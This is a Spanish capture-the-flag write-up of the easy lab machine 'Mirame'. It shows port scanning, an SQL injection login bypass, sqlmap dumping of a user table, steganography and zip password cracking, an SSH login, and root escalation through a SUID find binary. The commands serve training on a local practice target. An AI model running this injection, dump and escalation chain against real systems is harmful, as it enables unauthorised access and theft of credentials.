---
description: '✍️ Autor: maciiii___ 🔍 Dificultad: Fácil  📅 Fecha de creación: 12/08/2024'
---

# Mirame

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (899).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (900).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web sea un panel de Login.

<figure><img src="../../.gitbook/assets/image (901).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Probamos con credenciales básicas y nada pero con una inyección básica si tenemos suerte.

```bash
'or 1=1-- -
```

Tras esto nos sale este panel en que si ingresas algo te sale la temperatura.

<figure><img src="../../.gitbook/assets/image (902).png" alt=""><figcaption></figcaption></figure>

Vamos a probar con **sqlmap** para ver que bases de datos hay.

```bash
sqlmap -u "http://172.17.0.2/index.php" --forms --batch --dbs
```

<figure><img src="../../.gitbook/assets/image (903).png" alt=""><figcaption></figcaption></figure>

Ahora vemos el contenido de la base de datos **users**.

```bash
sqlmap -u "http://172.17.0.2/index.php" --forms --batch -D users --tables
```

<figure><img src="../../.gitbook/assets/image (904).png" alt=""><figcaption></figcaption></figure>

Ahora vemos el contenido de la tabla de **usuarios**.

```bash
sqlmap -u "http://172.17.0.2/index.php" --forms --batch -D users -T usuarios --dump
```

<figure><img src="../../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un usuario llamado **directorio** con la contraseña **directoriotravieso** suponemos que es un directorio por lo que miramos a ver.

<figure><img src="../../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>

Nos descargamos la imagen para ver si se puede usar la esteganografía. Usamos esta herramienta ya que contiene una contraseña.

```
stegcracker miramebien.jpg /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (907).png" alt=""><figcaption></figcaption></figure>

Miramos que contiene la imagen escondido.

```bash
steghide extract -sf miramebien.jpg
```

<figure><img src="../../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un archivo comprimido llamado **ocultito.zip** pero al descomprimirlo nos pide una contraseña. Por lo que usamos **John**.

```bash
zip2john ocultito.zip > hash
```

Usamos **John** para obtener la contraseña.

```bash
john hash
```

<figure><img src="../../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>

Descomprimimos ahora sí el `.zip`.

<figure><img src="../../.gitbook/assets/image (911).png" alt=""><figcaption></figcaption></figure>

Conseguimos unas credenciales.

```bash
ssh carlos@172.17.0.2
```

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos **SUDO**.

<figure><img src="../../.gitbook/assets/image (912).png" alt=""><figcaption></figcaption></figure>

Buscamos permisos **SUID**.

```bash
find / -perm -4000 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (913).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención **find** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/find/)cómo explotarlo.

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

<figure><img src="../../.gitbook/assets/image (914).png" alt=""><figcaption></figcaption></figure>
